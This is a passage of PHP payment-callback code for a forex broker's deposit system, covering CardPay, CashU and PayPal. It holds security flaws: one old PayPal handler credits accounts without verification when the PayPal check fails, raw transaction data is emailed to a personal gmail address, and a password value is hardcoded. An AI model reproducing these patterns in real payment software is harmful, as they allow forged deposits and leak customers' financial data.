                                    'payment_date' => $payment['payment_date'],
                                    'transaction_type' => 'CARDPAY',
                                    'payment_status' => $payment['payment_status'],
                                    'currency_status' => $payment['currency_status'],
                                    'fee' => $fee,
                                    'isFailed' => 0,
                                    'type' => 'deposit',
                                ];

                                $payment_data = [
                                    'transaction_id' => $payment['transaction_id'],
                                    'reference_id' => $payment['reference_id'],
                                    'status' => $payment['status'],
                                    'amount' => $amount,
                                    'currency' => $payment['currency'],
                                    'user_id' => $payment['user_id'],
                                    'payment_date' => $payment['payment_date'],
                                    'note' => $payment['note'],
                                    'transaction_type' => 'CARDPAY',
                                    'conv_amount' => $conv_amount,
                                ];

                                $config = [
                                    'server' => 'live_new',
                                ];
//                                $WebService = new WebService($config);
                                $account_number = $account_detail['account_number'];
                                $isBonusTen = false;
                                $isBonusTwenty = false;
                                $isBonusThirty = false;
                                $isBonusFifty = false;
                                $isBonusHundred = false;
                                // $isBonusHundredConstantCardpay = false;

//                                if (IPLoc::APIUpgradeDevIP()) {
                                    $WebServiceNew = FXPP::DepositRealFund($account_number, $amount, $this->comment_type['deposit'].$this->comment_transaction_type['CREDIT CARD'].$payment['reference_id']);
                                    $requestResult = $WebServiceNew['requestResult'];
                                    $ticket = $WebServiceNew['ticket'];
//                                } else {
//                                    $WebService->update_live_deposit_balance($account_number, $amount, $this->comment_type['deposit'].$this->comment_transaction_type['CREDIT CARD'].$payment['reference_id']);
//                                    $requestResult = $WebService->request_status;
//                                    $ticket = $WebService->get_result('Ticket');
//                                }

                                if ($requestResult === 'RET_OK') {
                                    $payment_data['mt_ticket'] = $ticket;

                                    //if($custom_fields['user_id'] == 73263){

                                    if ($payment['tenpercentbonus'] == 1) {
                                        $isBonusTen = true;
                                    }

                                    if ($payment['twentypercentbonus'] == 1) {
//                                            $finalAmount = $amount+$fee;
//                                            FXPP::DepositBonus($payment['user_id'], $account_number, $finalAmount, 'cardpay', 'twpb', $payment['transaction_id']);
                                        $isBonusTwenty = true;
                                    }

                                    if ($payment['thirtypercentbonus'] == 1) {
//                                            $finalAmount = $amount+$fee;
//                                            FXPP::DepositBonus($payment['user_id'], $account_number, $finalAmount, 'cardpay', 'tpb', $payment['transaction_id']);
                                        $isBonusThirty = true;
                                    }
                                    if ($payment['fiftypercentbonus'] == 1) {
//                                            $finalAmount = $amount+$fee;
//                                            FXPP::DepositBonus($payment['user_id'], $account_number, $finalAmount, 'cardpay', 'fpb', $payment['transaction_id']);
                                        $isBonusFifty = true;
                                    }
                                    if ($payment['hundredpercentbonus'] == 1) {
                                        $isBonusHundred = true;
                                    }

                                    // if ($payment['hundred_percent_constant_bonus'] == 1) {
                                    //     $isBonusHundredConstantCardpay = true;
                                    // }
                                    //}
                                    // Back Agent of Client
                                    //FXPP::BackAgentOfAccount($account_number);

                                    $WebService2 = new WebService($config);
                                    $WebService2->request_live_account_balance($account_number);
                                    if ($WebService2->request_status === 'RET_OK') {
                                        $balance = $WebService2->get_result('Balance');
                                        if ($custom_fields['login_type'] == 1) {
                                            $this->account_model->updatePartnerAccountBalance($account_number, $balance);
                                        } else {
                                            $this->account_model->updateAccountBalance($account_number, $balance);
                                        }

                                        //FXPP::extraCommission($account_number,$amount,$data['transaction_id']);  // Exatra commission update
                                    } else {
                                        $insertDepositFailed['comment'] = $WebService2->request_status;
                                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                                    }
                                } else {
                                    $insertDepositFailed['comment'] = $requestResult;
                                    $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                                }

                                if ($fee > 0) {
                                    $payment_data_fee = [
                                        'transaction_id' => $payment['transaction_id'],
                                        'reference_id' => $payment['reference_id'],
                                        'status' => $payment['status'],
                                        'amount' => $fee,
                                        'currency' => $payment['currency'],
                                        'user_id' => $payment['user_id'],
                                        'payment_date' => $payment['payment_date'],
                                        'note' => $payment['note'],
                                        'transaction_type' => 'CARDPAY',
                                        'conv_amount' => $conv_amount_fee,
                                    ];

//                                    $WebService = new WebService($config);
                                    $account_number = $account_detail['account_number'];

//                                    if (IPLoc::APIUpgradeDevIP()) {
                                        $WebServiceNew = FXPP::DepositRealFund($account_number, $fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['CREDIT CARD'].$payment['reference_id']);
                                        $requestResult = $WebServiceNew['requestResult'];
                                        $ticket = $WebServiceNew['ticket'];
//                                    } else {
//                                        $WebService->update_live_deposit_balance($account_number, $fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['CREDIT CARD'].$payment['reference_id']);
//                                        $requestResult = $WebService->request_status;
//                                        $ticket = $WebService->get_result('Ticket');
//                                    }

                                    if ($requestResult === 'RET_OK') {
                                        $payment_data_fee['mt_ticket'] = $ticket;

                                        $WebService2 = new WebService($config);
                                        $WebService2->request_live_account_balance($account_number);
                                        if ($WebService2->request_status === 'RET_OK') {
                                            $balance = $WebService2->get_result('Balance');
                                            if ($custom_fields['login_type'] == 1) {
                                                $this->account_model->updatePartnerAccountBalance($account_number, $balance);
                                            } else {
                                                $this->account_model->updateAccountBalance($account_number, $balance);
                                            }
                                            //FXPP::extraCommission($account_number,$amount,$data['transaction_id']);  // Exatra commission update
                                        } else {
                                            $insertDepositFailed['comment'] = $WebService2->request_status;
                                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                                        }
                                    } else {
                                        $insertDepositFailed['comment'] = $requestResult;
                                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                                    }
                                } else {
                                    $insertDepositFailed['comment'] = 'Fee is less than zero';
                                    $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                                }

                                if (!$this->deposit_model->insertPayment($payment_data)) {
                                    $asset_user_docs=$this->config->item('asset_user_docs');
                                    file_put_contents($asset_user_docs.'cardpay.log', $orderXML.PHP_EOL, FILE_APPEND);
                                } else {
                                    $this->deposit_model->deletePaymentQueueByTranId($payment['transaction_id']);
                                }

                                if ($fee > 0) {
                                    if (!$this->deposit_model->insertPayment($payment_data_fee)) {
                                        $asset_user_docs=$this->config->item('asset_user_docs');
                                        file_put_contents($asset_user_docs.'cardpay.log', $orderXML.PHP_EOL, FILE_APPEND);
                                    }
                                }

//                                 if ($isBonusTen) {
//                                    $finalAmount = $amount + $fee;
//                                    FXPP::DepositBonus($payment['user_id'], $account_number, $finalAmount, 'cardpay', 'tenpb', $payment['transaction_id']);
//                                }

                                if ($isBonusTwenty) {
                                    $finalAmount = $amount + $fee;
//                                    FXPP::DepositBonus($payment['user_id'], $account_number, $finalAmount, 'cardpay', 'twpb', $payment['transaction_id']);
                                    self::applyDepositBonus($payment['user_id'], $account_number, $finalAmount, 'cardpay', 'twpb', $payment['transaction_id'], false);
                                }

                                if ($isBonusThirty) {
                                    $finalAmount = $amount + $fee;
//                                    FXPP::DepositBonus($payment['user_id'], $account_number, $finalAmount, 'cardpay', 'tpb', $payment['transaction_id']);
                                    self::applyDepositBonus($payment['user_id'], $account_number, $finalAmount, 'cardpay', 'tpb', $payment['transaction_id'], false);
                                }

                                if ($isBonusFifty) {
                                    $finalAmount = $amount + $fee;
//                                    FXPP::DepositBonus($payment['user_id'], $account_number, $finalAmount, 'cardpay', 'fpb', $payment['transaction_id']);
                                    self::applyDepositBonus($payment['user_id'], $account_number, $finalAmount, 'cardpay', 'fpb', $payment['transaction_id'], false);
                                }

                                if ($isBonusHundred) {
                                    $finalAmount = $amount + $fee;
//                                    FXPP::Deposit100PercentBonus($payment['user_id'], $account_number, $finalAmount, 'cardpay', 'hplb', $payment['transaction_id']);
                                    self::applyDepositBonus($payment['user_id'], $account_number, $finalAmount, 'cardpay', 'hplb', $payment['transaction_id'], false);
                                }

                                // if ($isBonusHundredConstantCardpay) {
                                //     $finalAmount = $amount + $fee;
                                //    FXPP::DepositRegular100PercentBonus($payment['user_id'], $account_number, $finalAmount, 'cardpay', 'rhpb', $payment['transaction_id']);
                                // }

                                // Bonus Profit Cancellation*/
                                $bonuses = FXPP::getAccountBonusByType($account_number);
                                $cardpay_amount = $amount + $fee;
                                $RequestLogintype = $this->account_model->getAccountLoginType($payment['user_id']);
                                if ($RequestLogintype['login_type'] != 1) {
                                    if ($cardpay_amount > 0 and $bonuses[2] > 0) {
                                        FXPP::BonusProfitCancellation($payment['user_id'], $account_number, $cardpay_amount, $payment['transaction_id']);
                                    }
                                }

                                // Bonus Profit Logs**/
                                $ndbProfitLogs = [
                                    'Account_number' => $account_number,
                                    'DepAmount' => $cardpay_amount,
                                    'UserId' => $payment['user_id'],
                                    'TransactionId' => $payment['transaction_id'],
                                    'ndbbonus' => $bonuses[2],
                                ];
                                $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                                $insertProfitLogs = [
                                    'logs' => $encodeNdbProfitLogs,
                                    'User_Id' => $payment['user_id'],
                                ];

                                $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                                $this->SetAccountAgentPotentialFund($account_number);

                                $total_amount = floatval($conv_amount_fee) + floatval($payment_data['conv_amount']);
                                $comment = $this->comment_type['deposit'].$this->comment_transaction_type['CREDIT CARD'].$payment['reference_id'];

                                /**  Use original amount for Cent accounts**/
                                $isMicro = $this->account_model->isMicro($payment['user_id']);
                                if ($isMicro) {
                                    $total_amount = floatval($total_amount / 100);
                                }
                                /* End **/

                                /* Send successful email deposit to auto-reports **/
                                $this->sendEmailAfterSuccessDeposit('CardPay', $total_amount, $account_number, $payment['user_id'], $comment);
                            } else {
                                $this->deposit_model->deletePaymentQueueByTranId($payment['transaction_id']);
                            }
                        }
                    }
                }
            } else {
                if (!$this->deposit_model->insertPayment($data)) {
                    $asset_user_docs=$this->config->item('asset_user_docs');
                    file_put_contents($asset_user_docs.'cardpay.log', $orderXML.PHP_EOL, FILE_APPEND);
                }

                if ($custom_fields['login_type'] == 1) {
                    $account_detail = $this->partners_model->getAccountByUserId($orderXMLObj['customer_id']);
                    $account_detail['account_number'] = $account_detail['reference_num'];
                } else {
                    $account_detail = $this->account_model->getAccountByUserId($orderXMLObj['customer_id']);
                }

                if ($orderXMLObj['decline_reason'] == 'Declined by 3-D Secure') {
                    $reason = 'Card number did not passed 3-D Secure (failed authentication).';
                } else {
                    $reason = $orderXMLObj['decline_reason'];
                }

                $data = [
                    'account_number' => $account_detail['account_number'],
                    'type' => 'CardPay',
                    'reason' => $reason,
                ];
                $this->sendEmailFailedDeposit($data);

                if ($orderXMLObj['decline_reason'] != 'Cancelled by customer') {
                    FXPP::failedPaymentNotify('cardpay', 1, $orderXMLObj['customer_id'], $reason); //FXPP-9628
                }
            }
//            }else{
//                if ($status == 2) {
//                    if (!$this->deposit_model->checkTransactionExist($data['transaction_id'], 'CARDPAY')) {
//                        $config = array(
//                            'server' => 'live_new'
//                        );
//                        $WebService = new WebService($config);
//                        $account_number = $custom_fields['account_number'];
//                        $WebService->update_live_deposit_balance($account_number, $amount, $this->comment_type['deposit'] . $this->comment_transaction_type['CREDIT CARD'] . $data['reference_id']);
//                        if ($WebService->request_status === 'RET_OK') {
//                            $data['mt_ticket'] = $WebService->get_result('Ticket');

            // Back Agent of Client
//            FXPP::BackAgentOfAccount($account_number);

//                            $WebService2 = new WebService($config);
//                            $WebService2->request_live_account_balance($account_number);
//                            if ($WebService2->request_status === 'RET_OK') {
//                                $balance = $WebService2->get_result('Balance');
//                                $this->account_model->updateAccountBalance($account_number, $balance);
//                                //FXPP::extraCommission($account_number,$amount,$data['transaction_id']);  // Exatra commission update
//                            }
//                        }
//
//                        $this->SetAccountAgentPotentialFund($account_number);
//                    }
//                }
//
//                if (!$this->deposit_model->insertPayment($data)) {
//                    file_put_contents('/var/www/svn1/assets/user_docs/cardpay.log', $orderXML . PHP_EOL, FILE_APPEND);
//                }
//            }
        }
        ob_end_clean();
        echo 'OK';
    }

    public function apiTest()
    {
        $account_number = '1386';
        $amount = 100;
        $config = [
            'server' => 'live_new',
        ];
        $WebService = new WebService($config);
        $WebService->update_live_deposit_balance($account_number, $amount);
        if ($WebService->request_status === 'RET_OK') {
            // Back Agent of Client
            //FXPP::BackAgentOfAccount($account_number);

            $WebService2 = new WebService($config);
            $WebService2->request_live_account_balance($account_number);
            if ($WebService2->request_status === 'RET_OK') {
                $balance = $WebService2->get_result('Balance');
                var_dump($balance);
                //$this->account_model->updateAccountBalance($account_number, $balance);
            }
        }
    }

    public function cashuReturn()
    {
//        $data = array(
//            'transaction_id' => $this->input->post('trn_id'),
//            'reference_id' => $this->input->post('token'),
//            'status' =>0,
//            'amount' => $this->input->post('amount'),
//            'currency' => $this->input->post('currency'),
//            'user_id' => $this->input->post('session_id'),
//            'payment_date' => date('Y-m-d H:i:s', strtotime($this->input->post('trnDate'))),
//            'note' => $this->input->post(''),
//            'transaction_type' => 'cashU'
//        );
//        if(!$this->deposit_model->insertPayment($data)){
//            $this->cashu();
//        }
        $this->load->view('deposits/cashu_return');
    }

    public function cashuNotification()
    {
        $requestXML = $_REQUEST['sRequest'];
        $orderXMLObj = simplexml_load_string($requestXML);

        if (empty($orderXMLObj)) {
            show_404();
        }

        $token = md5(strtolower($this->cashu_merchant_id).':'.$orderXMLObj->cashU_trnID.':'.strtolower($this->cashu_token));

        if ($token == $orderXMLObj->cashUToken) {
            if ($orderXMLObj->responseCode == 'OK') {
                $date = new DateTime();
                $order_number = $date->getTimestamp();
                $amount = $orderXMLObj->amount;
                $user_id = $orderXMLObj->session_id;
                $currency = $orderXMLObj->currency;
                $conv_amount = $this->get_convert_amount($currency, $amount);
                $data = [
                    'transaction_id' => $orderXMLObj->cashU_trnID,
                    'reference_id' => $order_number,
                    'status' => 2,
                    'amount' => $amount,
                    'currency' => $orderXMLObj->currency,
                    'user_id' => $user_id,
                    'payment_date' => date('Y-m-d H:i:s', strtotime($orderXMLObj->trnDate)),
                    'note' => $orderXMLObj->txt1,
                    'transaction_type' => 'CASHU',
                    'conv_amount' => $conv_amount,
                ];

                $config = [
                    'server' => 'live_new',
                ];

                $user_account = $this->account_model->getAccountByUserId($user_id);

//                $WebService = new WebService($config);
                $account_number = $user_account['account_number'];

//                if (IPLoc::APIUpgradeDevIP()) {
                    $WebServiceNew = FXPP::DepositRealFund($account_number, $amount, $this->comment_type['deposit'].$this->comment_transaction_type['CASHU'].$data['transaction_id']);
                    $requestResult = $WebServiceNew['requestResult'];
//                } else {
//                    $WebService->update_live_deposit_balance($account_number, $amount, $this->comment_type['deposit'].$this->comment_transaction_type['CASHU'].$data['transaction_id']);
//                    $requestResult = $WebService->request_status;
//                }

                if ($requestResult === 'RET_OK') {
                    // Back Agent of Client
                   // FXPP::BackAgentOfAccount($account_number);

                    $WebService2 = new WebService($config);
                    $WebService2->request_live_account_balance($account_number);
                    if ($WebService2->request_status === 'RET_OK') {
                        $balance = $WebService2->get_result('Balance');
                        $this->account_model->updateAccountBalance($account_number, $balance);
                        //FXPP::extraCommission($account_number,$amount,$data['transaction_id']);  // Exatra commission update
                    }
                }

                if (!$this->deposit_model->insertPayment($data)) {
                    $response = '';
                    foreach ($orderXMLObj as $key => $value) {
                        //$value = urlencode(stripslashes($value));
                        $response .= $key.' = '.$value.'<br/>';
                    }

                    $response .= $token.'<br/>';
                    $response .= $orderXMLObj->responseCode.'<br/>';
                    $response .= $account_number.'<br/>';
                    $asset_user_docs=$this->config->item('asset_user_docs');
                    file_put_contents($asset_user_docs.'cashu.log', $response.PHP_EOL, FILE_APPEND);
                } else {
                    $response = '';
                    foreach ($orderXMLObj as $key => $value) {
                        //$value = urlencode(stripslashes($value));
                        $response .= $key.' = '.$value.'<br/>';
                    }

                    $response .= $token.'<br/>';
                    $response .= $orderXMLObj->responseCode.'<br/>';
                    $response .= $account_number.'<br/>';
                }

                $email_data = [
                    'full_name' => 'vela',
                    'email' => 'vela.nightclad@gmail.com',
                    'password' => '14563333',
                    'account_number' => $user_account['account_number'],
                ];
                $subject = 'CashU details';

                $this->load->library('email');

                $this->email->from('noreply@mail.forexmart.com', 'ForexMart');
                $this->email->reply_to('noreply@mail.forexmart.com', 'ForexMart');
                $this->email->to($email_data['email']);
                $this->email->subject($subject);
                $this->email->message($response);
                $this->email->send();
            }
        } else {
            $response = '';
            foreach ($orderXMLObj as $key => $value) {
                //$value = urlencode(stripslashes($value));
                $response .= $key.' = '.$value.'<br/>';
            }

            $response .= $token.'<br/>';
            $response .= $orderXMLObj->responseCode.'<br/>';

            $email_data = [
                'full_name' => 'vela',
                'email' => 'vela.nightclad@gmail.com',
                'password' => '14563333',
                'account_number' => '',
            ];
            $subject = 'CashU details';

            $this->load->library('email');

            $this->email->from('noreply@mail.forexmart.com', 'ForexMart');
            $this->email->reply_to('noreply@mail.forexmart.com', 'ForexMart');
            $this->email->to($email_data['email']);
            $this->email->subject($subject);
            $this->email->message($response);
            $this->email->send();
        }
    }

    public function cashuOrderNotification()
    {
    }

    public function cashuSorry()
    {
    }

    public function filspayReturn()
    {
        print_r($_POST);
    }

    public function paypal()
    {
        if ($this->session->userdata('logged')) {
            if (!IPLoc::IPOnlyForMe()) {
                redirect(FXPP::loc_url('deposit')); //FXPP-9351
            }

            $data['amount'] = $this->input->post_get('amount1', true);
            // if ($data['amount'] == null) {
            $this->form_validation->set_rules('currency', 'Currency', 'trim|required|xss_clean');
            $this->form_validation->set_rules('amount', 'Amount', 'trim|required|xss_clean');
            // }

            if ($this->session->userdata('login_type') == 1) {
                $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
            } else {
                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
            }

            //Validation for NDB accounts with Bonus Profit
//            $ndb_status = $this->withdraw_model->hasCancelledNDBbonus($this->session->userdata('user_id'));
//            $hasInNdbBonus = $this->NodepositBonusValidation($this->session->userdata('user_id'));
//            if ($hasInNdbBonus == 2) { //has Ndb Bonus
//                $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation();//returns false if no open trades
//            }

            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));

            if ($this->form_validation->run() && !$data['error_msg']) {
                // if (!$data['CurPendValidation']['TradeError'] || $ndb_status) { //FXPP-5960

                $amount = $this->input->post('amount', true);
                $mt_currency = $this->input->post('currency', true);
                $converted_amount = $this->get_convert_amount($mt_currency, $amount, 'USD'); // convert amount before we send to paypal

                if ($amount >= 1) {
                    $date = new DateTime();
                    $order_number = $date->getTimestamp();

                    if ($this->session->userdata('login_type') == 1) {
                        $account = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                        $account['account_number'] = $account['reference_num'];
                    } else {
                        $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                    }

                    $additional_bonus = $this->validateAdditionalBonus($this->input->get('addBonus')); //FXPP-12571

                    $custom_fields = 'user_id='.$this->session->userdata('user_id').';'.'account_number='.$account['account_number'].';'.'bonus='.$this->input->get('bonus').';'.'login_type='.$this->session->userdata('login_type').';'.'additional_bonus='.$additional_bonus;
                    $test_users = unserialize(TEST_USERS_DEPOSIT);
                    if (in_array($this->session->userdata('user_id'), $test_users)) {
                        $data = [
                                'link' => 'https://www.sandbox.paypal.com/cgi-bin/webscr',
                                // 'link' => "https://www.paypal.com/cgi-bin/webscr",
                                'business' => 'paypal-facilitator@forexmart.com',
                                'return_url' => site_url().'deposit',
                                'cancel_url' => site_url().'deposit/paypal?status=cancelled',
                                'notify_url' => site_url().'deposit/paypalNotify',
                                'currency_code' => $this->input->post('currency', true),
                                'amount' => $converted_amount,
                                'item_name' => 'ForexMart Deposit (PayPal - ['.$account['account_number'].'])',
                                'item_number' => $order_number,
                                'custom' => FXPP::encrypt_data($custom_fields, $this->encrypt_key),
                            ];
                    } else {
                        if (IPLoc::Office()) {
                            $data = [
                                    //                    'link'          => "https://www.sandbox.paypal.com/cgi-bin/webscr",
                                    'link' => 'https://www.paypal.com/cgi-bin/webscr',
//                                        'business' => "paypal-id@forexmart.com",
                                    'business' => 'paypal@instaforex.eu',
                                    'return_url' => site_url().'deposit',
                                    'cancel_url' => site_url().'deposit/paypal?status=cancelled',
                                    'notify_url' => site_url().'deposit/paypalNotify',
                                    'currency_code' => $this->input->post('currency', true),
                                    'amount' => $amount,
                                    'item_name' => 'ForexMart Deposit (PayPal - ['.$account['account_number'].'])',
                                    'item_number' => $order_number,
                                    'custom' => FXPP::encrypt_data($custom_fields, $this->encrypt_key),
                                ];
                        } else {
                            $data = [
                                    //                    'link'          => "https://www.sandbox.paypal.com/cgi-bin/webscr",
                                    'link' => 'https://www.paypal.com/cgi-bin/webscr',
//                                        'business' => "paypal-id@forexmart.com", //"paypal_account@forexmart.com",
                                    'business' => 'paypal@instaforex.eu',
                                    'return_url' => site_url().'deposit',
                                    'cancel_url' => site_url().'deposit/paypal?status=cancelled',
                                    'notify_url' => site_url().'deposit/paypalNotify',
                                    'currency_code' => $this->input->post('currency', true),
                                    'amount' => $amount,
                                    'item_name' => 'ForexMart Deposit (PayPal - ['.$account['account_number'].'])',
                                    'item_number' => $order_number,
                                    'custom' => FXPP::encrypt_data($custom_fields, $this->encrypt_key),
                                ];
                        }
                    }
                    $this->load->view('deposits/paypal_payment', $data);
                } else {
                    $data['error'] = true;
                    $data['error_message'] = 'The Amount field is required.';
                }

//                } else {
//                    $data['error'] = true;
//                    $data['error_message'] = $data['CurPendValidation']['TradeErrorMsg'];
//                }
            } else {
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
                //  $data['user_status'] = $user_status;
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';
                //if(IPLoc::Office()){
                if ($this->session->userdata('login_type') == 1) {
                    $account = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                } else {
                    $account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                }
                //}
                $data['account'] = $account;
                // if(IPLoc::Office()){
                if ($this->session->userdata('login_type') == 1) {
                    $account['mt_currency_base'] = $account['currency'];
                    $data['account']['mt_currency_base'] = $account['currency'];
                    $data['account']['account_number'] = $account['reference_num'];
                }
                // print_r($data['account']);s
                // }
                $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['mt_currency_base']);
                $data['account']['currency_new'] = $data['account']['currency'];
                if ($data['account']['currency_new'] == 'RUB') {
                    $data['account']['currency_new'] = 'RUR';
                }
                $data['option'] = $this->general_model->selectOptionList(FXPP::getUserAccountCurrencyBase());
                $data['metadata_description'] = 'Provide the necessary information to deposit via Filspay. Request is processed within 2-3 working days.';

                $data['cancelled'] = $data['error_msg'] == 'Transaction has been cancelled.' ? 1 : 0;

                // Sending email to cancelled transaction
                $this->load->helper('url_query_string_helper');
                $full_url = current_full_url();
                parse_str(parse_url($full_url, PHP_URL_QUERY), $params);

                if (isset($params['status']) && $params['status'] == 'cancelled') {
                    if ($this->session->userdata('login_type') == 1) {
                        $account_detail = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                    } else {
                        $account_detail = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                    }
                    $details = [
                        'account_number' => $account_detail['account_number'],
                        'type' => 'PayPal',
                        'reason' => 'CANCELLED',
                    ];
                    if ($this->session->userdata('login_type') == 1) {
                        $details['account_number'] = $account_detail['reference_num'];
                    }
                    $this->sendEmailFailedDeposit($details);
                }

                $this->template->title('ForexMart | Deposit - PayPal')
                    ->set_layout('internal/main')
                    ->prepend_metadata("
                     <script src='".$this->template->Js()."custom-deposit.js'></script>
                            ")
                    ->build('deposits/paypal', $data);
            }
        } else {
            redirect('signout');
        }
    }

    public function paypalNotifyOld()
    {
//
        //echo $subject;
        //exit();
        // Response from Paypal
        $response = '';
        foreach ($_POST as $key => $value) {
            //$value = urlencode(stripslashes($value));
            $response .= $key.' = '.$value.'<br/>';
        }
        // $this->sendemail_->mailler('bug.fxpp@gmail.com','Paypal Payment Test',$response);
        // read the post from PayPal system and add 'cmd'
        $req = 'cmd=_notify-validate';
        foreach ($_POST as $key => $value) {
            $value = urlencode(stripslashes($value));
            $value = preg_replace('/(.*[^%^0^D])(%0A)(.*)/i', '${1}%0D%0A${3}', $value); // IPN fix
            $req .= "&$key=$value";
        }

        // assign posted variables to local variables
        /* $data['item_name']           = $_POST['item_name'];
          $data['item_number']      = $_POST['item_number'];
          $data['payment_status']   = $_POST['payment_status'];
          $data['payment_amount']   = $_POST['mc_gross'];
          $data['payment_currency'] = $_POST['mc_currency'];
          $data['txn_id']               = $_POST['txn_id'];
          $data['receiver_email']   = $_POST['receiver_email'];
          $data['payer_email']      = $_POST['payer_email'];
          $data['custom']           = base64_decode($_POST['custom']); */
        $decrypt_fields = FXPP::decrypt_data($this->input->post('custom', true), $this->encrypt_key);
        $custom_fields = [];
        $fields = explode(';', $decrypt_fields);
        foreach ($fields as $element) {
            $attributes = explode('=', $element);
            if (count($attributes) > 1) {
                $custom_fields[$attributes[0]] = $attributes[1];
            }
        }

        $paypal_amount = $this->input->post('mc_gross', true);
        $currency = $this->input->post('mc_currency', true);
        $account = $this->account_model->getAccountByUserId($custom_fields['user_id']);
        $mt_currency = strtoupper(trim($account['mt_currency_base']));

        if ($mt_currency == strtoupper($currency)) {
            $amount = $paypal_amount;
        } else {
            $amount = $this->get_convert_amount($currency, $paypal_amount, $mt_currency);
        }

        $conv_amount = $this->get_convert_amount($mt_currency, $amount);

        $data = [
            'transaction_id' => $this->input->post('txn_id', true),
            'reference_id' => $this->input->post('item_number', true),
            'status' => 0,
            'amount' => $amount,
            'currency' => $this->input->post('mc_currency', true),
            'user_id' => $custom_fields['user_id'],
            'payment_date' => date('Y-m-d H:i:s', strtotime($this->input->post('payment_date', true))),
            'note' => $this->input->post('item_name', true).'['.$account['mt_currency_base'].']',
            'transaction_type' => 'PAYPAL',
            'conv_amount' => $conv_amount,
        ];

        // post back to PayPal system to validate
        $header = "POST /cgi-bin/webscr HTTP/1.0\r\n";
        $header .= "Content-Type: application/x-www-form-urlencoded\r\n";
        $header .= 'Content-Length: '.strlen($req)."\r\n\r\n";

        $fp = fsockopen('ssl://ipnpb.paypal.com', 443, $errno, $errstr, 30);

        if (!$fp) {
            $email_data = [
                'full_name' => 'moniruzzaman',
                'email' => 'vela.nightclad@gmail.com',
                'password' => '14563333',
                'account_number' => $response.'<br/>fp!',
            ];
            $subject = 'Paypal details';
            $config = [
                'mailtype' => 'html',
            ];

            $this->general_model->sendEmail('welcome-html', $subject, $email_data['email'], $email_data, $config);

            if (strtoupper($this->input->post('payment_status', true)) == 'COMPLETED') {
                $data['status'] = 2;
                $config = [
                    'server' => 'live_new',
                ];
//                $WebService = new WebService($config);
                $account_number = $custom_fields['account_number'];

//                if (IPLoc::APIUpgradeDevIP()) {
                    $WebServiceNew = FXPP::DepositRealFund($account_number, $amount, $this->comment_type['deposit'].$this->comment_transaction_type['PAYPAL'].$data['transaction_id']);
                    $requestResult = $WebServiceNew['requestResult'];
                    $ticket = $WebServiceNew['ticket'];
//                } else {
//                    $WebService->update_live_deposit_balance($account_number, $amount, $this->comment_type['deposit'].$this->comment_transaction_type['PAYPAL'].$data['transaction_id']);
//                    $requestResult = $WebService->request_status;
//                    $ticket = $WebService->get_result('Ticket');
//                }

                if ($requestResult === 'RET_OK') {
                    $data['mt_ticket'] = $ticket;

                    // Back Agent of Client
                   // FXPP::BackAgentOfAccount($account_number);

                    $WebService2 = new WebService($config);
                    $WebService2->request_live_account_balance($account_number);
                    if ($WebService2->request_status === 'RET_OK') {
                        $balance = $WebService2->get_result('Balance');
                        $this->account_model->updateAccountBalance($account_number, $balance);
                        //  ////FXPP::extraCommission($account_number,$amount,$data['transaction_id']);  // Exatra commission update
                    }
                }

                $this->deposit_model->insertPayment($data);
            } else {
                $this->deposit_model->insertPayment($data);
            }
        } else {
            if (strtoupper($this->input->post('payment_status', true)) == 'COMPLETED') {
                fputs($fp, $header.$req);
                while (!feof($fp)) {
                    $res = fgets($fp, 1024);
                    if (strcmp($res, 'VERIFIED') == 0) {
                        $response .= '<br/>VERIFIED:'.$res;
                        $data['status'] = 2;
                        $config = [
                            'server' => 'live_new',
                        ];
//                        $WebService = new WebService($config);
                        $account_number = $custom_fields['account_number'];

//                        if (IPLoc::APIUpgradeDevIP()) {
                            $WebServiceNew = FXPP::DepositRealFund($account_number, $amount, $this->comment_type['deposit'].$this->comment_transaction_type['PAYPAL'].$data['transaction_id']);
                            $requestResult = $WebServiceNew['requestResult'];
                            $ticket = $WebServiceNew['ticket'];
//                        } else {
//                            $WebService->update_live_deposit_balance($account_number, $amount, $this->comment_type['deposit'].$this->comment_transaction_type['PAYPAL'].$data['transaction_id']);
//                            $requestResult = $WebService->request_status;
//                            $ticket = $WebService->get_result('Ticket');
//                        }

                        if ($requestResult === 'RET_OK') {
                            $data['mt_ticket'] = $ticket;

                            // Back Agent of Client
                           // FXPP::BackAgentOfAccount($account_number);

                            $WebService2 = new WebService($config);
                            $WebService2->request_live_account_balance($account_number);
                            if ($WebService2->request_status === 'RET_OK') {
                                $balance = $WebService2->get_result('Balance');
                                $this->account_model->updateAccountBalance($account_number, $balance);
                                //  ////FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
                            }
                        }
                        $this->deposit_model->insertPayment($data);
                    } elseif (strcmp($res, 'INVALID') == 0) {
                        $response .= '<br/>INVALID:'.$res;
                        $this->deposit_model->insertPayment($data);
                    }
                }
                fclose($fp);

                $email_data = [
                    'full_name' => 'moniruzzaman',
                    'email' => 'vela.nightclad@gmail.com',
                    'password' => '14563333',
                    'account_number' => $response,
                ];
                $subject = 'Paypal details';
                $config = [
                    'mailtype' => 'html',
                ];
                $this->general_model->sendEmail('welcome-html', $subject, $email_data['email'], $email_data, $config);
            } else {
                $this->deposit_model->insertPayment($data);
            }
        }
    }

    /**
     * Function Name: paypalNotify
     * Description:
     * > This is where PayPal send their callback response.
